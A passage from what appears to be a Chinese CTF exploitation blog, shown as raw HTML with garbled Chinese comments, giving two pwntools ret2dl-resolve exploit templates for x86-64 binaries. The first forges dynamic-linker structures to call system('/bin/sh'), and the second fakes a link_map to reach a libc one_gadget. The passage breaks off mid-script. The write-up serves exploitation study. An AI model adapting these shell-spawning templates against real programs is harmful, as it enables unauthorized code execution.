class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#éœ€ä¿®æ”¹:æ–‡ä»¶åã€æº¢å‡ºåç§»ã€leave_retåœ°å€</span></span><br><span class="line">fpath = <span class="string">&#x27;./myRet2dl_puts&#x27;</span></span><br><span class="line">elf = ELF(fpath)</span><br><span class="line">p = process(fpath)</span><br><span class="line"></span><br><span class="line">offset_rbp = <span class="number">0x80</span></span><br><span class="line"><span class="comment">#è¯»å–é•¿åº¦</span></span><br><span class="line">length = <span class="number">0x400</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line"><span class="comment">#mainå‡½æ•°ä¸­æ‰¾</span></span><br><span class="line">leave_ret=<span class="number">0x40066A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb_a</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *&#123;0&#125; \n c&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makecall</span>(<span class="params">addr, rdi,rsi,rdx,tail = <span class="number">0</span></span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(p6_addr)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    <span class="keyword">if</span> (tail):</span><br><span class="line">        payload += p64(<span class="number">0x0</span>) * <span class="number">7</span> + p64(tail)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">p6_addr=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x5a</span></span><br><span class="line">call_addr=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x40</span></span><br><span class="line">p_rdi_ret=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x63</span></span><br><span class="line">p_rbp_ret=elf.sym[<span class="string">&#x27;register_tm_clones&#x27;</span>] + <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&quot;.plt&quot;</span>)[<span class="string">&quot;sh_addr&quot;</span>]</span><br><span class="line">dynstr, dynsym, rel_plt = <span class="built_in">map</span>(elf.dynamic_value_by_tag,</span><br><span class="line">                                                      [<span class="string">&quot;DT_STRTAB&quot;</span>, <span class="string">&quot;DT_SYMTAB&quot;</span>, <span class="string">&quot;DT_JMPREL&quot;</span>])</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment"># write_got = elf.got[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># write_plt = elf.plt[&#x27;write&#x27;]</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">got_8=elf.get_section_by_name(<span class="string">&#x27;.got.plt&#x27;</span>).header.sh_addr+<span class="number">8</span>   <span class="comment">#0x601008</span></span><br><span class="line">bss_addr =elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">#print &#x27;got_8=&#x27;,hex(got_8)</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;main_addr&quot;</span>,main_addr)</span><br><span class="line">lg(<span class="string">&quot;p6_addr&quot;</span>,p6_addr)</span><br><span class="line">lg(<span class="string">&quot;p_rdi_ret&quot;</span>,p_rdi_ret)</span><br><span class="line">lg(<span class="string">&quot;p_rbp_ret&quot;</span>,p_rbp_ret)</span><br><span class="line">lg(<span class="string">&quot;plt_0&quot;</span>,plt_0)</span><br><span class="line">lg(<span class="string">&quot;dynstr&quot;</span>,dynstr)</span><br><span class="line">lg(<span class="string">&quot;dynsym&quot;</span>,dynsym)</span><br><span class="line">lg(<span class="string">&quot;rel_plt&quot;</span>,rel_plt)</span><br><span class="line">lg(<span class="string">&quot;puts_got&quot;</span>,puts_got)</span><br><span class="line">lg(<span class="string">&quot;puts_plt&quot;</span>,puts_plt)</span><br><span class="line"><span class="comment"># lg(&quot;write_got&quot;,write_got)</span></span><br><span class="line"><span class="comment"># lg(&quot;write_plt&quot;,write_plt)</span></span><br><span class="line">lg(<span class="string">&quot;read_got&quot;</span>,read_got)</span><br><span class="line">lg(<span class="string">&quot;read_plt&quot;</span>,read_plt)</span><br><span class="line">lg(<span class="string">&quot;got_8&quot;</span>,got_8)</span><br><span class="line">lg(<span class="string">&quot;bss_addr&quot;</span>,bss_addr)</span><br><span class="line">lg(<span class="string">&quot;base_stage&quot;</span>,base_stage)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!\n&quot;)        # &#x27;Welcome to XDCTF2015~!\n&#x27;</span></span><br><span class="line"><span class="comment">#1.æ³„éœ²&amp;link_mapåœ°å€</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=makecall(puts_got,got_8,<span class="number">0</span>,<span class="number">0</span>,tail=main_addr)</span><br><span class="line"><span class="comment">#payload+=makecall(write_got,1,got_8,8,tail=main_addr)</span></span><br><span class="line"><span class="comment">#è¿™lengthçœ‹å…·ä½“æƒ…å†µï¼Œæ²¡å•¥ç”¨</span></span><br><span class="line">payload=payload.ljust(length,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb_a(0x400674)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#p.send(payload)</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">link_map = u64Leakbase(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;link_map=&#x27;</span>,<span class="built_in">hex</span>(link_map)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2.å¾€link_map+0x1c8å†™0</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=makecall(read_got,<span class="number">0</span>,link_map+<span class="number">0x1c8</span>,<span class="number">8</span>,tail=main_addr)</span><br><span class="line"><span class="comment">#è¿™lengthçœ‹å…·ä½“æƒ…å†µï¼Œæ²¡å•¥ç”¨</span></span><br><span class="line">payload=payload.ljust(length,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.å¾€base_stageå†™å…¥ä¼ªé€ ç»“æ„å¹¶è·³è¿‡å»</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=makecall(read_got,<span class="number">0</span>,base_stage,<span class="number">0xd0</span>,tail=<span class="number">0</span>)   <span class="comment">#å‡è®¾ç»“æ„å¤§å°æ˜¯400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(base_stage)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line"><span class="comment">#è¿™lengthçœ‹å…·ä½“æƒ…å†µï¼Œæ²¡å•¥ç”¨</span></span><br><span class="line">payload=payload.ljust(length,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.bssæ•°æ®ï¼šrop-å‚æ•°æ”¾åœ¨å¯„å­˜å™¨/ ä¼ªé€ ç»“æ„  </span></span><br><span class="line"><span class="comment">#(1)ç¡®å®šå„ä¸ªèŠ‚çš„åœ°å€ </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(2)ç¡®å®šé‡å®šä½ä¸‹æ ‡</span></span><br><span class="line">index_offset = base_stage + <span class="number">7</span>*<span class="number">8</span></span><br><span class="line">align = <span class="number">24</span> - ((index_offset-rel_plt) % <span class="number">24</span>)  <span class="comment"># è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„ELF64_R_SYMç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°</span></span><br><span class="line">index_offset = index_offset + align</span><br><span class="line">index = (index_offset - rel_plt) / <span class="number">24</span> <span class="comment"># base_stage + 7*8 æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§»</span></span><br><span class="line"><span class="comment">#(3)ç¡®å®šåŠ¨æ€é“¾æ¥ç¬¦å·ä¸‹æ ‡</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">13</span>*<span class="number">8</span></span><br><span class="line">align = <span class="number">24</span> - ((fake_sym_addr - dynsym) % <span class="number">24</span>)<span class="comment"># è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf64_Symç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">24</span> <span class="comment"># é™¤ä»¥24å› ä¸ºElf64_Symç»“æ„ä½“çš„å¤§å°ä¸º24ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å·</span></span><br><span class="line"><span class="comment">#(4)ä¼ªé€ é‡å®šä½ç»“æ„+åŠ¨æ€é“¾æ¥ç»“æ„</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">32</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p64(puts_got) + p64(r_info) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#fake_reloc = p64(write_got) + p64(r_info) + p64(0)</span></span><br><span class="line">st_name = (fake_sym_addr + <span class="number">24</span>) - dynstr   <span class="comment">#fake_symï¼ˆElf32_Symç»“æ„ä½“ï¼‰å¤§å°0x10</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0x12</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload2 += p64(p_rdi_ret)</span><br><span class="line">payload2 += p64(base_stage+<span class="number">0xc0</span>)   <span class="comment">#/bin/sh</span></span><br><span class="line">payload2 += p64(plt_0)</span><br><span class="line">payload2 += p64(index)       <span class="comment">#jmprel ä¸‹æ ‡å‚æ•°</span></span><br><span class="line">payload2 += <span class="string">&#x27;AAAAAAAA&#x27;</span>       <span class="comment">#è¿”å›åœ°å€</span></span><br><span class="line">payload2 += <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(index_offset-base_stage,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">payload2 += fake_reloc <span class="comment"># index_offset(base_stage+7*8)çš„ä½ç½®</span></span><br><span class="line">payload2 = payload2.ljust(fake_sym_addr-base_stage,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">payload2 += fake_sym   <span class="comment"># fake_sym_addr(base_stage+9*8)çš„ä½ç½®</span></span><br><span class="line"></span><br><span class="line">payload2 += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0xd0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4006ab&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&#x27;wait!!\n&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>å¦‚æœæ˜¯putså‡½æ•°åˆ™ç›´æ¥å¯¹åº”ä¿®ä¿®è¡¥è¡¥å³å¯</p>

        <h4 id="â‘¡åªæœ‰readå’Œlibcæ–‡ä»¶"   >
          <a href="#â‘¡åªæœ‰readå’Œlibcæ–‡ä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡åªæœ‰readå’Œlibcæ–‡ä»¶" class="headerlink" title="â‘¡åªæœ‰readå’Œlibcæ–‡ä»¶"></a>â‘¡åªæœ‰readå’Œlibcæ–‡ä»¶</h4>
      <p>è¿™ä¸ªæœ€å¼€å§‹çš„é¢˜ç›®å¥½åƒæ˜¯0CTFçš„é¢˜ç›®blackhole2ï¼Œè¿™ç§æƒ…å†µä¹Ÿå¯ä»¥å¯¹åº”æ‹¿æ¨¡æ¿æ‰“ï¼ŒåŸç†å°±æ˜¯è°ƒç”¨libcä¸­çš„one_gadgetæ¥getshellã€‚è¿™ä¸ªæ¨¡æ¿ä¹Ÿæ˜¯å‚ç…§bsauceå¸ˆå‚…çš„æ¨¡æ¿ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#éœ€ä¿®æ”¹:æ–‡ä»¶åã€æº¢å‡ºåç§»ã€gadgetåœ°å€ã€å„èŠ‚åœ°å€</span></span><br><span class="line">fpath = <span class="string">&#x27;./bstack&#x27;</span></span><br><span class="line">elf = ELF(fpath)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">p = process(fpath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset_rbp = <span class="number">0x70</span></span><br><span class="line">length = <span class="number">0x100</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">leave_ret=<span class="number">0x00000000004006AB</span></span><br><span class="line"><span class="comment">#one_gadgetå·¥å…·æ¥æ‰¾</span></span><br><span class="line">one_gadget = <span class="number">0x4f432</span></span><br><span class="line">vuln_addr=<span class="number">0x400676</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb_a</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *&#123;0&#125; \n c&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makecall</span>(<span class="params">addr, rdi, rsi, rdx, tail = <span class="number">0</span></span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(p6_addr)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    <span class="keyword">if</span> (tail):</span><br><span class="line">        payload += p64(<span class="number">0x0</span>) * <span class="number">7</span> + p64(tail)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&quot;.plt&quot;</span>)[<span class="string">&quot;sh_addr&quot;</span>]</span><br><span class="line">p6_addr=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x5a</span></span><br><span class="line">call_addr=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x40</span></span><br><span class="line">p_rdi_ret=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x63</span></span><br><span class="line">p_rbp_ret=elf.sym[<span class="string">&#x27;register_tm_clones&#x27;</span>] + <span class="number">0x38</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">got_8=elf.get_section_by_name(<span class="string">&#x27;.got.plt&#x27;</span>).header.sh_addr+<span class="number">8</span>   <span class="comment">#0x601008</span></span><br><span class="line">bss_addr =elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">libc_bss_addr = libc.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">libc_start_main_addr = libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">fake_link_map=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]    <span class="comment">#change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">fake_st_value=one_gadget-libc_start_main_addr    <span class="comment">#0x4526a   0xf02a4     0xf1147</span></span><br><span class="line">fake_r_offset=libc_bss_addr-libc_start_main_addr</span><br><span class="line"><span class="comment"># fake_st_value=0x4526a-0x20740    #0x4526a   0xf02a4     0xf1147</span></span><br><span class="line"><span class="comment"># fake_r_offset=0x3c5720-0x20740</span></span><br><span class="line"></span><br><span class="line">val_0x68=base_stage+<span class="number">0xc0</span>-<span class="number">8</span>    <span class="comment">#0x600ea8</span></span><br><span class="line">val_0x70=base_stage+<span class="number">0xc0</span>-<span class="number">8</span>    <span class="comment">#0x600eb8</span></span><br><span class="line">val_0xf8=base_stage+<span class="number">0xc0</span>-<span class="number">8</span>    <span class="comment">#0x600f28</span></span><br><span class="line">wait_time=<span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recv()        # &#x27;Welcome to XDCTF2015~!\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.å¾€fake_link_map+0x68å†™å€¼</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=makecall(read_got,<span class="number">0</span>,fake_link_map+<span class="number">0x68</span>,<span class="number">16</span>,tail=vuln_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb_a(0x4006AA)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(wait_time)</span><br><span class="line">p.send(p64(val_0x68)+p64(val_0x70))</span><br><span class="line"></span><br><span class="line"><span class="comment">#2.å¾€fake_link_map+0xf8å†™å€¼</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=makecall(read_got,<span class="number">0</span>,fake_link_map+<span class="number">0xf8</span>,<span class="number">8</span>,tail=vuln_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(wait_time)</span><br><span class="line">p.send(p64(val_0xf8))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.å¾€base_stageå†™å…¥ä¼ªé€ ç»“æ„å¹¶è·³è¿‡å»</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=makecall(read_got,<span class="number">0</span>,base_stage,<span class="number">0xd0</span>,tail=<span class="number">0</span>)   <span class="comment">#å‡è®¾ç»“æ„å¤§å°æ˜¯400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(base_stage)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.bssæ•°æ®ï¼šrop-å‚æ•°æ”¾åœ¨å¯„å­˜å™¨/ ä¼ªé€ ç»“æ„  </span></span><br><span class="line"><span class="comment">#(1)ç¡®å®šå„ä¸ªèŠ‚çš„åœ°å€ </span></span><br><span class="line">plt_1 = plt_0+<span class="number">6</span></span><br><span class="line"><span class="comment">#(2)ç¡®å®šé‡å®šä½ä¸‹æ ‡</span></span><br><span class="line">align = <span class="number">24</span> - (<span class="number">56</span> % <span class="number">24</span>)  <span class="comment"># è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„ELF64_R_SYMç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°</span></span><br><span class="line">index_offset = base_stage + <span class="number">7</span>*<span class="number">8</span> + align</span><br><span class="line">index = (<span class="number">7</span>*<span class="number">8</span> + align) / <span class="number">24</span> <span class="comment"># base_stage + 7*8 æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§»</span></span><br><span class="line"><span class="comment">#(3)ç¡®å®šåŠ¨æ€é“¾æ¥ç¬¦å·ä¸‹æ ‡</span></span><br><span class="line">align = <span class="number">24</span> - ((<span class="number">13</span>*<span class="number">8</span>) % <span class="number">24</span>)<span class="comment"># è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf64_Symç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">13</span>*<span class="number">8</span> + align</span><br><span class="line">index_dynsym = (<span class="number">13</span>*<span class="number">8</span> + align) / <span class="number">24</span> <span class="comment"># é™¤ä»¥24å› 